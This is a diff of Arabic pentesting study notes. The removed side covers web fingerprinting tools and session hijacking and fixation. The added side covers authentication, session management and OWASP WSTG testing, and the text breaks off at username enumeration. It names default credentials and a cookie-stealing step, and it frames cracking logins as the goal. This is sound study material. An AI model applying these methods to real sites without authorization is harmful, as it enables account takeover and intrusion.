-<li>
-<p>بيحلل الموقع ويقولك:</p>
-</li>
-<li>
-<p>CMS</p>
-</li>
-<li>Plugins</li>
-<li>Frameworks</li>
-<li>CDN</li>
-</ul>
-<hr />
-<p><strong>📊</strong> <strong>مثال نتايج:</strong></p>
-<ul>
-<li>WordPress</li>
-<li>MailChimp</li>
-<li>Google Analytics</li>
-<li>Cloudflare</li>
-</ul>
-<hr />
-<p><strong>🔥</strong> <strong>مميزاته:</strong></p>
-<ul>
-<li>سهل جدًا</li>
-<li>Passive 100%</li>
-<li>مناسب للبداية</li>
-</ul>
-<hr />
-<p><strong>🌐 Wappalyzer</strong></p>
-<p><strong>💡</strong> <strong>ده أهم من BuiltWith</strong> <strong>شوية</strong></p>
-<p>بيوريك:</p>
-<ul>
-<li>CMS → WordPress</li>
-<li>لغة → PHP</li>
-<li>Database → MySQL</li>
-<li>Plugins</li>
-<li>JS libraries</li>
-</ul>
-<hr />
-<p><strong>🔥</strong> <strong>ليه أحسن؟</strong></p>
-<ul>
-<li>UI بسيط</li>
-<li>أسرع</li>
-<li>معلومات واضحة</li>
-</ul>
-<hr />
-<p><strong>📌</strong> <strong>مثال من الفيديو:</strong></p>
-<p>طلع:</p>
-<ul>
-<li>WordPress</li>
-<li>PHP</li>
-<li>MySQL</li>
-<li>
-<p>Plugins زي:</p>
-</li>
-<li>
-<p>Jetpack</p>
-</li>
-<li>Mailchimp</li>
-</ul>
-<hr />
-<p><strong>🟣 2. Command Line Tool</strong></p>
-<p><strong>⚙️ WhatWeb</strong></p>
-<p><strong>💡</strong> <strong>ده level</strong> <strong>أعلى شوية</strong></p>
-<hr />
-<p><strong>🔧</strong> <strong>استخدامه:</strong></p>
-<p>whatweb target.com</p>
-<hr />
-<p><strong>🧠</strong> <strong>بيطلع إيه؟</strong></p>
-<ul>
-<li>Web Server (Apache / Nginx)</li>
-<li>PHP version</li>
-<li>Headers</li>
-<li>Cookies</li>
-<li>JS libraries</li>
-<li>Redirects</li>
-<li>Emails أحيانًا 👀</li>
-</ul>
-<hr />
-<p><strong>📊</strong> <strong>مثال من الفيديو:</strong></p>
-<p>طلع:</p>
-<ul>
-<li>Apache</li>
-<li>PHP</li>
-<li>WordPress</li>
-<li>jQuery version</li>
-<li>Headers</li>
-</ul>
-<hr />
-<p><strong>🔴</strong> <strong>حاجة مهمة جدًا (Headers)</strong></p>
-<p>WhatWeb بيطلع:</p>
-<p><strong>HTTP Headers</strong></p>
-<p>زي:</p>
-<p>Server: Apache<br />
-X-Powered-By: PHP</p>
-<hr />
-<p><strong>🧠</strong> <strong>دي بتفيدك في إيه؟</strong></p>
-<ul>
-<li>تعرف version → تدور على CVEs</li>
-<li>تعرف framework → exploit جاهز</li>
-</ul>
-<hr />
-<p><strong>🟠</strong> <strong>فكرة الـ Stack</strong></p>
-<p>الفيديو قال:</p>
-<p><strong>🧱 LAMP Stack</strong></p>
-<ul>
-<li>Linux</li>
-<li>Apache</li>
-<li>MySQL</li>
-<li>PHP</li>
-</ul>
-<hr />
-<p>💡 لما تعرف ده:</p>
-<p>تبقى فاهم البيئة كلها</p>
-<hr />
-<p><strong>🟢</strong> <strong>ليه الكلام ده مهم جدًا؟</strong></p>
-<p><strong>لأنه بيساعدك تعمل:</strong></p>
-<p><strong>🎯 Attack Mapping</strong></p>
-<p>يعني:</p>
-<ul>
-<li>WordPress → WPScan</li>
-<li>PHP → RCE / File upload</li>
-<li>Apache → Misconfig</li>
-<li>JS libraries → XSS</li>
-</ul>
-<hr />
-<p><strong>🔥</strong> <strong>مثال عملي (</strong><strong>تفكير Pentester)</strong></p>
-<p>لو طلعت:</p>
-<ul>
-<li>WordPress</li>
-<li>Plugin: vulnerable-plugin</li>
-<li>PHP 7.x</li>
-</ul>
-<p>📌 تعمل إيه؟</p>
-<p>56.            تدور على:</p>
-<ul>
-<li>CVE للـ plugin</li>
-</ul>
-<p>57.            تشوف:</p>
-<ul>
-<li>Exploit على GitHub</li>
-</ul>
-<p>58.            تبدأ attack</p>
-<hr />
-<p><strong>⚠️</strong> <strong>نقطة جامدة في الفيديو</strong></p>
-<p>قال:</p>
-<p>استخدم أكتر من tool</p>
-<p>ليه؟<br />
-لأن:</p>
-<ul>
-<li>كل tool بيشوف حاجة مختلفة</li>
-</ul>
-<hr />
-<p><strong>🧠</strong> <strong>مقارنة سريعة</strong></p>
-<table>
-<thead>
-<tr>
-<th><strong>Tool</strong></th>
-<th><strong>النوع</strong></th>
-<th><strong>الاستخدام</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>BuiltWith</td>
-<td>Browser</td>
-<td>Overview</td>
-</tr>
-<tr>
-<td>Wappalyzer</td>
-<td>Browser</td>
-<td>سريع وواضح</td>
-</tr>
-<tr>
-<td>WhatWeb</td>
-<td>CLI</td>
-<td>Detailed</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<p><strong>🔴 WAF Detection (</strong><strong>اتذكرت في الآخر)</strong></p>
-<p>زي:</p>
-<p><strong>🛡️ Cloudflare</strong></p>
-<hr />
-<p><strong>💡</strong> <strong>ليه مهم؟</strong></p>
-<p>لو فيه WAF:</p>
-<ul>
-<li>هيمنع attacks</li>
-<li>لازم تغير tactics</li>
-</ul>
-<hr />
-<p><strong>🟣</strong> <strong>معلومات إضافية طلعت في الفيديو</strong></p>
-<p><strong>✅ Emails</strong> <strong>من الموقع</strong></p>
-<p>أحيانًا tools زي WhatWeb:</p>
-<ul>
-<li>بتلقط emails 👀</li>
-</ul>
-<hr />
-<p><strong>✅ JavaScript Libraries</strong></p>
-<p>زي:</p>
-<ul>
-<li>jQuery</li>
-<li>moment.js</li>
-</ul>
-<p>💡 ممكن يكون فيها:</p>
-<ul>
-<li>XSS vulnerabilities<br />
-    6-session hijacking &amp; session fixation<br />
-<a href="#fn-2">[2]</a></li>
-</ul>
-<p><a href="#fnref-1">↩︎</a><a href="#fnref-1-1">↩︎</a></p>
-<ol>
-<li><strong>أولاً: يعني إيه Session</strong> <strong>أصلاً؟</strong></li>
-</ol>
-<p>ببساطة:</p>
-<ul>
-<li>لما تعمل login لأي موقع، السيرفر بيديك <strong>Session ID</strong> (غالبًا في Cookie)</li>
-<li>الـ Session ده هو اللي بيقول للسيرفر: <em>"__الشخص ده متسجل دخول بالفعل"</em></li>
-</ul>
-<p>يعني بدل ما تكتب الباسورد كل مرة، بيتم الاعتماد على الـ session.</p>
-<hr />
-<p><strong>🟠 Session Hijacking (</strong><strong>سرقة السيشن)</strong></p>
-<p><strong>💡</strong> <strong>الفكرة الأساسية:</strong></p>
-<p>المهاجم <strong>بيسرق</strong> <strong>Session ID</strong> <strong>بتاعك</strong> ويستخدمه كأنه أنت.</p>
-<p><strong>🧠</strong> <strong>تخيلها كده:</strong></p>
-<p>معاك كارت دخول لنادي VIP<br />
-لو حد سرق الكارت → يقدر يدخل مكانك بدون باسورد</p>
-<hr />
-<p><strong>⚙️</strong> <strong>بيحصل إزاي؟</strong></p>
-<p><strong>1. Session Prediction (</strong><strong>تخمين السيشن)</strong></p>
-<p>لو السيشن بيتولد بشكل غبي زي:</p>
-<p>user001<br />
-user002<br />
-admin003</p>
-<p>المهاجم ممكن يخمنه بسهولة 😅</p>
-<hr />
-<p><strong>2. Session Sniffing (</strong><strong>التجسس على الشبكة)</strong></p>
-<p>لو الموقع مش بيستخدم HTTPS:</p>
-<ul>
-<li>المهاجم يراقب الترافيك</li>
-<li>يلقط الـ session token</li>
-</ul>
-<p>زي لما تستخدم Wi-Fi مفتوحة ☠️</p>
-<hr />
-<p><strong>3. XSS (</strong><strong>أخطرهم</strong> <strong>🔥)</strong></p>
-<p>المهاجم يحقن JavaScript في الموقع:</p>
-<p>document.cookie</p>
-<p>ويبعت الكوكيز بتاعتك ليه</p>
-<p>👉 ودي اسمها Cookie Stealing</p>
-<hr />
-<p><strong>🎭</strong> <strong>مرحلة الانتحال (Impersonation)</strong></p>
-<p>بعد ما يجيب الـ session:</p>
-<ul>
-<li>يبعته مع الطلبات للسيرفر</li>
-<li>السيرفر يقول: "ده المستخدم الحقيقي"</li>
-</ul>
-<hr />
-<p><strong>💥</strong> <strong>النتائج:</strong></p>
-<ul>
-<li>سرقة بيانات</li>
-<li>Account Takeover</li>
-<li>تحويل فلوس</li>
-<li>تعديل/حذف بيانات</li>
-</ul>
-<hr />
-<p><strong>🔵 Session Fixation (</strong><strong>تثبيت السيشن)</strong></p>
-<p>ده مختلف شوية وناس كتير بتتلخبط فيه 👇</p>
-<p><strong>💡</strong> <strong>الفكرة:</strong></p>
-<p>المهاجم <strong>مش بيسرق السيشن</strong><br />
-هو <strong>بيخلي الضحية يستخدم</strong> <strong>Session</strong> <strong>هو عارفه مسبقًا</strong></p>
-<hr />
-<p><strong>🧠</strong> <strong>تخيلها:</strong></p>
-<p>المهاجم يديك كارت VIP جاهز<br />
-ويقولك: "ادخل بيه"<br />
-أول ما تدخل → هو أصلاً معاه نفس الكارت 😈</p>
-<hr />
-<p><strong>⚙️</strong> <strong>الخطوات:</strong></p>
-<p><strong>1.</strong> <strong>المهاجم يجيب Session ID</strong></p>
-<p>مثلاً:</p>
-<p>ABC123</p>
-<hr />
-<p><strong>2.</strong> <strong>يبعته للضحية</strong></p>
-<p>عن طريق:</p>
-<ul>
-<li>لينك:</li>
-</ul>
-<p>example.com/login?session=ABC123</p>
-<ul>
-<li>أو Social Engineering</li>
-</ul>
-<hr />
-<p><strong>3.</strong> <strong>الضحية يعمل Login</strong> <strong>بنفس السيشن</strong></p>
-<p>🚨 هنا المشكلة:<br />
-الموقع <strong>ما بيغيرش السيشن بعد تسجيل الدخول</strong></p>
-<hr />
-<p><strong>4.</strong> <strong>المهاجم يدخل بنفس السيشن</strong></p>
-<p>ويبقى هو والضحية نفس الحساب!</p>
-<hr />
-<p><strong>⚖️</strong> <strong>الفرق بين Hijacking</strong> <strong>و Fixation</strong></p>
-<table>
-<thead>
-<tr>
-<th><strong>النقطة</strong></th>
-<th><strong>Session Hijacking</strong></th>
-<th><strong>Session Fixation</strong></th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>وقت الهجوم</td>
-<td>بعد تسجيل الدخول</td>
-<td>قبل تسجيل الدخول</td>
-</tr>
-<tr>
-<td>الطريقة</td>
-<td>سرقة السيشن</td>
-<td>فرض سيشن على الضحية</td>
-</tr>
-<tr>
-<td>الهدف</td>
-<td>استخدام Session مسروق</td>
-<td>استخدام Session معروف مسبقًا</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<p><strong>🛡️</strong> <strong>الحماية (</strong><strong>مهم جدًا في شغلك كـ Pentester)</strong></p>
-<p><strong>ضد Hijacking:</strong></p>
-<ul>
-<li>استخدام HTTPS دايمًا</li>
-<li>HttpOnly &amp; Secure Cookies</li>
-<li>تقليل مدة السيشن</li>
-<li>استخدام 2FA</li>
-</ul>
-<hr />
-<p><strong>ضد Fixation:</strong></p>
-<ul>
-<li>
-<p>🔥 أهم حاجة:</p>
-</li>
-<li>
-<p><strong>تغيير Session ID</strong> <strong>بعد login</strong></p>
-</li>
-<li>
-<p>عدم قبول session من URL</p>
-</li>
-<li>استخدام Cookies فقط</li>
-</ul>
-<hr />
-<p><strong>🎯</strong> <strong>خلاصة سريعة:</strong></p>
-<ul>
-<li><strong>Hijacking =</strong> <strong>سرقة السيشن</strong></li>
-<li><strong>Fixation =</strong> <strong>تثبيت سيشن معروف قبل login</strong></li>
-<li>الاتنين بيعتمدوا على ضعف إدارة الـ Sessions</li>
-</ul>
-<p><a href="#fnref-2">↩︎</a></p>
+  <h1>Untitled</h1>
+
+<p>Authentication &amp; Authorization :
+[^1]</p>
+<p>[^1]: ## أولًا: يعني إيه Authentication؟</p>
+<pre><code>ببساطة:  
+**Authentication = "مين أنت؟"**
+
+يعني السيستم بيحاول يتأكد من هويتك.
+
+### أمثلة:
+
+- Username + Password
+- OTP (كود على الموبايل)
+- Fingerprint / Face ID
+- JWT Token
+
+👉 الهدف:  
+يتأكد إنك **user حقيقي ومصرّح لك تدخل**
+
+---
+
+## 🧠 مثال بسيط (اللي الفيديو استخدمه)
+
+تخيل عندك أوضة مقفولة 🚪
+
+- الباب = النظام (System)
+- المفتاح / الباسورد = Authentication
+- الدخول = تم التحقق منك
+
+لو معاك المفتاح الصح → تدخل  
+لو لأ → تفضل برا ❌
+
+---
+
+## 🔓 طيب إيه Authorization؟
+
+**Authorization = "تقدر تعمل إيه؟"**
+
+يعني بعد ما دخلت… السيستم بيسألك:  
+👉 هل مسموح لك تعمل الحاجة دي؟
+
+---
+
+### مثال عملي:
+
+أنت دخلت موقع (Login) ✔️  
+→ ده Authentication
+
+حاولت تفتح `/admin`  
+→ هنا Authorization
+
+- لو Admin → تدخل
+- لو User عادي → Access Denied ❌
+
+---
+
+## 🔥 الفرق المهم جدًا (احفظه كده)
+
+|النوع|السؤال|مثال|
+|---|---|---|
+|Authentication|مين أنت؟|Login|
+|Authorization|مسموح لك بإيه؟|Access admin panel|
+
+---
+
+## ⚠️ نقطة الناس بتغلط فيها (مهمة جدًا في البنتست)
+
+لو مش قادر تدخل الـ admin panel ❌  
+ده **مش مشكلة Authentication**
+
+ده:  
+👉 **Authorization Issue**
+
+---
+
+## 🧪 العمليات اللي بتحصل
+
+### 1. Authentication Process
+
+- السيستم بياخد credentials:
+    - password
+    - token
+- يقارنها في الـ database
+- لو صح → Login
+
+---
+
+### 2. Authorization Process
+
+- السيستم يشوف:
+    - role (admin / user)
+    - permissions
+
+ويقارن:  
+👉 هل الشخص ده ينفع يعمل request ده؟
+
+---
+
+## 🎯 النتيجة (Outcome)
+
+### Authentication:
+
+- ✔️ Logged in
+- ❌ Login failed
+
+### Authorization:
+
+- ✔️ Access granted
+- ❌ Access denied
+
+---
+
+## 🔗 العلاقة بينهم
+
+الاتنين شغالين مع بعض:
+
+1. الأول: Authentication
+2. بعده: Authorization
+
+بس خد بالك 👇  
+أحيانًا Authorization يحصل حتى لو مش Logged in  
+(زي check إنك لازم تعمل login أصلاً)
+
+---
+
+## 🚨 ليه Authentication مهم جدًا؟
+
+لأنه:
+
+- أول خط دفاع 🛡️
+- يمنع:
+    - Account Takeover
+    - Data Breach
+    - Unauthorized Access
+
+---
+
+## 💣 من ناحية Pentesting (دي بقى الحتة التقيلة 🔥)
+
+لازم تبقى فاهم الفرق عشان تعرف نوع الثغرة:
+
+### 🧨 Authentication Vulnerabilities:
+
+- Weak passwords
+- Brute force
+- Credential stuffing
+- Broken login logic
+
+---
+
+### 🧨 Authorization Vulnerabilities:
+
+- IDOR
+- Privilege escalation
+- Access control bypass
+
+---
+
+## 🧠 خلاصة جامدة تحفظها
+
+&gt; Authentication = إثبات الهوية  
+&gt; Authorization = التحكم في الصلاحيات
+
+---
+
+## 🔥 نصيحة من الآخر
+
+اللي بيفرق pentester عادي من شاطر 👇  
+إنه يقدر يقول:
+
+&gt; "دي Authentication issue ولا Authorization issue؟"
+
+مش بس يلاقي الثغرة… لكن **يصنفها صح**
+</code></pre>
+<p>Authentication Types :
+[^2]</p>
+<p>[^2]: # أولًا: يعني إيه Authentication Mechanism؟</p>
+<pre><code>ببساطة:
+
+&gt; **هو الطريقة اللي السيستم بيستخدمها علشان يتأكد إنك أنت فعلًا الشخص ده**
+
+يعني:
+
+- مش بس "في login"
+- لكن **إزاي بيتم التحقق؟**
+
+---
+
+## 🔑 مثال (نفس فكرة الباب)
+
+- الباب = النظام
+- القفل = Authentication Mechanism
+
+يعني:  
+👉 القفل ممكن يكون:
+
+- مفتاح 🔑
+- بصمة 👆
+- كود 📱
+- كارت 💳
+
+كل دي **mechanisms مختلفة لنفس الهدف**
+
+---
+
+# 🔥 أنواع الـ Authentication Mechanisms
+
+خلينا نمشي واحدة واحدة 👇
+
+---
+
+## 1️⃣ Password-Based Authentication (الأساسي)
+
+### 💡 الفكرة:
+
+- Username + Password
+
+### 📌 مثال:
+
+mostafa123 / P@ssw0rd
+
+### ✅ ده معناه:
+
+- Username → يعرفك
+- Password → يثبت إنك أنت
+
+---
+
+### ⚠️ مشاكله (مهم جدًا كبنتستر):
+
+- Weak passwords
+- Reuse passwords
+- Brute force
+- Credential stuffing
+
+👉 ده أسهل نوع يتهاك
+
+---
+
+## 2️⃣ Multi-Factor Authentication (MFA)
+
+### 💡 الفكرة:
+
+&gt; تستخدم **أكتر من عامل للتحقق**
+
+### الأنواع الأساسية:
+
+|النوع|مثال|
+|---|---|
+|حاجة تعرفها|Password|
+|حاجة تملكها|Phone|
+|حاجة أنت|Fingerprint|
+
+---
+
+### 📌 مثال:
+
+- Password + OTP من الموبايل
+
+---
+
+### 🔥 ليه مهم؟
+
+حتى لو:
+
+- الباسورد اتسرق ❌  
+    → الهاكر مش هيقدر يدخل
+
+---
+
+### ⚠️ كبنتستر:
+
+بتدور على:
+
+- Bypass MFA
+- Logic flaws
+- OTP reuse
+
+---
+
+## 3️⃣ Two-Factor Authentication (2FA)
+
+ده نوع من MFA بس:
+
+&gt; **بالظبط عاملين فقط**
+
+---
+
+### 📌 مثال:
+
+- Password + OTP
+
+---
+
+### 🔐 أنواع OTP:
+
+- SMS
+- Email
+- Authenticator App (زي Google Authenticator)
+
+---
+
+### ⚠️ نقطة خطيرة:
+
+SMS مش آمن ❌  
+بسبب:  
+👉 SIM Swap Attack
+
+---
+
+### 🔥 الأفضل:
+
+- Authenticator App ✔️
+
+---
+
+## 4️⃣ Token-Based Authentication
+
+### 💡 الفكرة:
+
+بدل ما تكتب الباسورد كل مرة:
+
+👉 السيستم يديك **Token**
+
+---
+
+### 📌 مثال:
+
+- JWT (JSON Web Token)
+- OAuth Token
+
+---
+
+### 🧠 بيشتغل إزاي؟
+
+1. Login
+2. السيرفر يديك Token
+3. كل request بعد كده:
+
+Authorization: Bearer TOKEN
+
+---
+
+### ✅ المميزات:
+
+- أسرع
+- scalable
+- مناسب للـ APIs
+
+---
+
+### ⚠️ كبنتستر:
+
+ركز هنا جدًا 🔥
+
+بتدور على:
+
+- Token leakage
+- Expired token misuse
+- Weak signing (JWT)
+- IDOR via token
+
+---
+
+## 5️⃣ Single Sign-On (SSO)
+
+### 💡 الفكرة:
+
+&gt; تسجل مرة واحدة → تدخل كل حاجة
+
+---
+
+### 📌 مثال:
+
+- "Login with Google"
+- "Login with Facebook"
+
+---
+
+### 🧠 بيشتغل بإيه؟
+
+- OAuth
+- SAML
+
+---
+
+### ✅ الميزة:
+
+- User experience جامد
+- مش محتاج login كل مرة
+
+---
+
+### ⚠️ كبنتستر:
+
+- Token misconfiguration
+- Trust issues
+- Open redirect
+
+---
+
+## 6️⃣ One-Time Password (OTP)
+
+### 💡 الفكرة:
+
+&gt; كود بيستخدم مرة واحدة بس
+
+---
+
+### 📌 بييجي منين؟
+
+- SMS
+- Email
+
+---
+
+### 🧠 بيستخدم في:
+
+- Login
+- Password reset
+
+---
+
+### ⚠️ كبنتستر:
+
+ركز هنا 👇
+
+- OTP brute force
+- OTP reuse
+- No rate limit
+- Predictable OTP
+
+---
+
+# 🔗 ربط مهم جدًا
+
+كل الأنواع دي هدفها واحد:
+
+&gt; ✅ التأكد من الهوية  
+&gt; لكن  
+&gt; ❗ بطرق مختلفة ومستويات أمان مختلفة
+
+---
+
+# 🧠 خلاصة جامدة (احفظها)
+
+|النوع|القوة|الاستخدام|
+|---|---|---|
+|Password|ضعيف|أساسي|
+|2FA|متوسط|شائع|
+|MFA|قوي|أنظمة مهمة|
+|Token|قوي|APIs|
+|SSO|يعتمد|شركات|
+|OTP|مساعد|Verification|
+
+---
+
+# 💣 كـ Pentester (الزتونة 🔥)
+
+كل mechanism = attack surface
+
+يعني:
+
+|النوع|الهجوم|
+|---|---|
+|Password|Brute force|
+|2FA|Bypass|
+|Token|Steal / Forge|
+|SSO|Misconfig|
+|OTP|Bruteforce / Replay|
+
+---
+
+# 🚀 نصيحة ليك
+
+ابدأ تبص لكل login system كده:
+
+1. نوع الـ auth إيه؟
+2. في MFA ولا لأ؟
+3. Token ولا session؟
+4. في OTP؟
+5. في SSO؟
+
+وبعدين تسأل نفسك:
+
+&gt; "أكسره إزاي؟ 😈"
+</code></pre>
+<p>Session Management :
+[^3]</p>
+<p>[^3]: # أولًا: الصورة الكبيرة (Big Picture)</p>
+<pre><code>عندنا 3 مفاهيم لازم تفرق بينهم:
+
+### 1) Authentication
+
+👉 “مين أنت؟”
+
+- Login (username + password)
+
+### 2) Authorization
+
+👉 “مسموح لك تعمل إيه؟”
+
+- user / admin / VIP
+
+### 3) Session Management ⭐ (المهم هنا)
+
+👉 “إزاي السيستم يفضل فاكر إنك logged in؟”
+
+---
+
+# 💡 المشكلة الأساسية: HTTP Stateless
+
+بروتوكول HTTP **مش بيحفظ الحالة (stateless)**  
+يعني كل Request لوحده:
+
+Request 1: login  
+Request 2: open dashboard  
+Request 3: view profile
+
+السيرفر مش فاكر إنهم من نفس الشخص 😅
+
+👉 الحل: **Session**
+
+---
+
+# 🧠 يعني إيه Session؟
+
+Session = طريقة تخلي السيرفر “يفتكر” المستخدم
+
+- عبارة عن **Session ID**
+- بيتخزن غالبًا في **Cookie**
+- بيتبعت مع كل request
+
+---
+
+# ⚙️ أهم جزء: إزاي الـ Session بتتعمل؟ (ركز هنا 🔥)
+
+خلينا نمشي خطوة خطوة:
+
+---
+
+## 🟢 Step 1: User يعمل Login
+
+POST /login  
+username=admin  
+password=123456
+
+---
+
+## 🟢 Step 2: السيرفر يتحقق (Authentication)
+
+- يقارن البيانات مع الداتا بيز
+- لو صح → يكمل
+
+---
+
+## 🟢 Step 3: إنشاء Session ⭐
+
+السيرفر يعمل:
+
+### ✅ Generate Session ID
+
+مثال:
+
+SESSIONID = abx72ks9s91kss
+
+🔴 مهم جدًا:
+
+- لازم يكون **Random + طويل + صعب التخمين**
+
+---
+
+### ✅ تخزين Session على السيرفر
+
+مثال:
+
+SESSIONID: abx72ks9s91kss
+
+Data:  
+- user_id: 5  
+- role: admin  
+- login_time: 10:30
+
+---
+
+### ✅ إرسال Session للمتصفح (Cookie)
+
+Set-Cookie: SESSIONID=abx72ks9s91kss
+
+---
+
+## 🟢 Step 4: المستخدم يعمل Requests بعد كده
+
+كل Request هيبقى فيه:
+
+Cookie: SESSIONID=abx72ks9s91kss
+
+---
+
+## 🟢 Step 5: السيرفر يتحقق من Session
+
+- يقرأ الـ Session ID
+- يجيب بياناته من السيرفر
+- يقول: "آه ده user 5 → دخله"
+
+---
+
+# 🎯 مثال عملي سريع
+
+### Request:
+
+GET /dashboard  
+Cookie: SESSIONID=abc123
+
+### السيرفر:
+
+- يلاقي session
+- يعرف إنك logged in
+- يرجع الصفحة
+
+---
+
+# 🔁 Lifecycle بتاع الـ Session
+
+### 1. Creation
+
+بعد login
+
+### 2. Maintenance
+
+كل request يستخدم نفس الـ session
+
+### 3. Expiration
+
+- timeout (مثلاً 30 دقيقة)
+- logout
+
+### 4. Termination
+
+- session يتلغى
+
+---
+
+# 🧩 نقطة مهمة جدًا
+
+⚠️ مش لازم تعمل login علشان تاخد session
+
+مثال:
+
+- تدخل موقع → يديلك session
+- ليه؟
+    - يحفظ اللغة
+    - dark mode
+    - shopping cart
+
+---
+
+# 🎭 أفضل تشبيه (بس أبسط من الفيديو 😄)
+
+### 🎟️ Authentication = تذكرة الدخول
+
+### 🪪 Session ID = الإسورة (wristband)
+
+### 🚪 Authorization = الأماكن اللي مسموح تدخلها
+
+---
+
+# 🔐 Session Security (مهم جدًا في pentest)
+
+ليه مهم؟
+
+لأن لو حد سرق الـ Session ID = خلاص بقى أنت 😈
+
+---
+
+## أخطر الهجمات:
+
+### 1. Session Hijacking
+
+يسرق الـ cookie
+
+### 2. Session Fixation
+
+يخليك تستخدم session هو محدده
+
+### 3. Replay Attack
+
+يعيد استخدام session
+
+---
+
+# 🛡️ الحماية
+
+- HTTPS
+- HttpOnly cookie
+- Secure flag
+- SameSite
+- Session timeout
+- Regenerate session بعد login
+
+---
+
+# 🔥 الخلاصة
+
+- HTTP مش بيحفظ الحالة
+- Session بتحل المشكلة دي
+- السيرفر بيعمل Session ID
+- يخزنه + يديه للمتصفح
+- المتصفح يبعت الـ ID كل مرة
+- السيرفر يستخدمه يعرفك
+</code></pre>
+<p>Authentication Testing methodology :
+[^4]</p>
+<p>[^4]: # أول حاجة: يعني إيه Authentication Testing؟</p>
+<pre><code>ببساطة:
+
+&gt; هو إنك تختبر كل حاجة ليها علاقة بـ **تأكيد هوية المستخدم** وتشوف هل ممكن تتكسر ولا لأ.
+
+📌 يعني بتختبر:
+
+- Login form
+- Reset password
+- 2FA / MFA
+- Session handling المرتبط بالـ login
+
+🎯 الهدف:
+
+- تدخل من غير صلاحية (Unauthorized Access)
+- ترفع صلاحياتك (Privilege Escalation)
+- أو تسرق session (Session Hijacking)
+
+---
+
+# 🧠 الفكرة الأساسية في المحاضرة
+
+الراجل بيقولك:
+
+&gt; متشتغلش عشوائي… اشتغل بـ **Methodology (منهجية)**
+
+وهنا بيستخدم دليل مهم جدًا:
+
+👉 OWASP  
+👉 OWASP Web Security Testing Guide
+
+---
+
+# 📚 الفرق المهم جدًا (ناس كتير بتتلخبط فيه)
+
+❌ OWASP Top 10  
+= قائمة vulnerabilities
+
+✅ WSTG  
+= **دليل عملي يقولك:**
+
+- تختبر إيه
+- تختبره إزاي
+- إمتى تختبره
+
+💡 يعني زي Cheat Sheet لأي Pentester
+
+---
+
+# 🔍 ليه WSTG مهم؟
+
+- بيخليك **مش بتنسى حاجة**
+- بيخلي شغلك **consistent**
+- بيساعدك في **كتابة التقرير بشكل احترافي**
+
+---
+
+# 🧪 أقسام Authentication Testing (المهم بقى 🔥)
+
+هقسمهولك زي ما هو في المحاضرة:
+
+---
+
+## 1️⃣ Testing Credentials Over HTTPS
+
+📌 بتشيك:  
+هل اليوزر والباسورد بيتبعتوا بـ HTTPS؟
+
+❌ لو HTTP → خطر (MITM Attack)
+
+---
+
+## 2️⃣ Testing Default Credentials
+
+📌 مثال:
+
+admin:admin  
+root:toor
+
+💥 كتير من الأنظمة بتسيبها زي ما هي
+
+---
+
+## 3️⃣ Testing Weak Lockout Mechanism
+
+📌 هل فيه حماية ضد brute force؟
+
+مثال:
+
+- 3 attempts → lock account
+- rate limit
+
+❌ لو مفيش → تقدر brute force بسهولة
+
+---
+
+## 4️⃣ Testing Authentication Bypass 🔥
+
+📌 أخطر نوع
+
+&gt; تدخل من غير login أصلاً 😈
+
+مثال:
+
+- تغيير request
+- manipulation في parameters
+- logic flaw
+
+---
+
+## 5️⃣ Testing Remember Me Function
+
+📌 هل بيخزن بيانات خطيرة؟
+
+❌ مشاكل:
+
+- token مش encrypted
+- predictable token
+
+---
+
+## 6️⃣ Testing Forgot Password Function
+
+📌 هل بيكشف info؟
+
+❌ مثال:
+
+- "Email not found" → User Enumeration
+
+✅ الصح:
+
+- "If account exists, we sent email"
+
+---
+
+## 7️⃣ Testing Browser Cache
+
+📌 هل البيانات الحساسة بتتخزن؟
+
+❌ ممكن attacker يشوفها من cache
+
+---
+
+## 8️⃣ Testing Weak Password Policy
+
+📌 هل الموقع بيسمح بـ:
+
+- 123456
+- password
+
+💥 ده بيسهل:
+
+- brute force
+- dictionary attack
+
+---
+
+## 9️⃣ Testing Alternative Channels
+
+📌 مهم جدًا 🔥
+
+&gt; هل الموبايل أو API أضعف من الويب؟
+
+💡 مثال:
+
+- Web فيه حماية قوية
+- Mobile API ضعيف → تدخل منه
+
+---
+
+# ⚔️ الهجمات اللي اتذكرت
+
+المحاضرة أشارت ليهم بسرعة:
+
+- Brute Force
+- Dictionary Attack
+- Credential Stuffing
+- Session Fixation
+- Authentication Bypass
+- Rate Limit Bypass
+- CAPTCHA bypass (مش bypass مباشر، لكن automation)
+
+---
+
+# 🎯 الهدف النهائي من كل ده
+
+كـ Pentester:
+
+1. تدخل السيستم
+2. ترفع صلاحياتك
+3. تسرق sessions
+4. تثبت impact في التقرير
+
+---
+
+# 🧾 نقطة مهمة جدًا (كتابة التقرير)
+
+WSTG بيساعدك في:
+
+- وصف الثغرة
+- خطوات إعادة الاستغلال (Reproduce)
+- توضيح التأثير (Impact)
+- اقتراح الحلول (Remediation)
+
+---
+
+# 🧠 نقطة عبقرية في WSTG
+
+بيوفرلك:
+
+### ✔️ Test Objective
+
+انت بتختبر إيه
+
+### ✔️ How to Test
+
+تعملها إزاي
+
+### ✔️ Tools
+
+تستخدم إيه
+
+### ✔️ Remediation
+
+تصلحها إزاي
+
+---
+
+# 🧪 أنواع الـ Testing
+
+- Black Box → مش عارف حاجة
+- Gray Box → معاك شوية معلومات
+
+---
+
+# 💡 مثال عملي من المحاضرة (Lockout)
+
+بيقولك:
+
+جرب:
+
+- تدخل باسورد غلط 3 مرات
+- هل الحساب بيقفل؟
+
+لو لا → Vulnerability
+
+---
+
+# 🤖 نقطة الـ CAPTCHA
+
+المحاضرة قالت حاجة مهمة:
+
+&gt; الكابتشا مش مانع للهجوم… بس بيعقده
+
+💡 تقدر:
+
+- تعمل automation
+- تستخدم OCR
+- أو replay attack
+
+---
+
+# 🧭 Structure الـ WSTG
+
+الدليل فيه مراحل:
+
+- Information Gathering
+- Configuration Testing
+- Authentication Testing ← (اللي انت فيه)
+- Session Management (جاية بعدين)
+
+---
+
+# 🧠 خلاصة المحاضرة (أهم 5 نقاط)
+
+لو عايز تختصرها:
+
+1. Authentication Testing = كسر login system
+2. استخدم WSTG كـ roadmap
+3. اختبر كل حاجة حوالين login (مش بس الفورم)
+4. دور على logic flaws مش بس brute force
+5. أهم حاجة: تثبت الـ impact
+</code></pre>
+<p>Username Enumeration :
+[^5]</p>
+<p>[^5]: # أولاً: يعني إيه Username Enumeration؟</p>
+<pre><code>ببساطة:
+
